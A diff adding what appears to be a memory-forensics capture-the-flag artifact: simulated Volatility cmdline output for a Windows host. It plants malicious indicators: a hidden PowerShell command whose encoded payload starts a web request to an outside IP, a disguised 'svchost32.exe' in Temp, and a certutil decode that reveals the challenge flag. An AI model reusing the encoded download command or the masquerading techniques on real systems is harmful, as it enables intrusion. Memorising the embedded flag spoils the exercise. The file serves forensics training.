@@ -1,0 +1,26 @@
+COMMAND LINE ARGUMENTS FROM MEMORY
+Extracted using: volatility cmdline
+
+PID 412: smss.exe
+Command line: \SystemRoot\System32\smss.exe
+
+PID 524: csrss.exe
+Command line: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows
+
+PID 668: services.exe
+Command line: C:\Windows\system32\services.exe
+
+PID 684: lsass.exe
+Command line: C:\Windows\system32\lsass.exe
+
+PID 2048: explorer.exe
+Command line: C:\Windows\Explorer.EXE
+
+PID 3456: powershell.exe
+Command line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADgANQAuADIANAAzAC4AMQA
+
+PID 3724: svchost32.exe
+Command line: C:\Windows\Temp\svchost32.exe -install -service
+
+PID 3892: cmd.exe
+Command line: "C:\Windows\system32\cmd.exe" /c echo Q1RGe21lbW9yeV9mb3JlbnNpY3NfaXNfZnVufQ== | certutil -decode -f temp.txt && type temp.txt
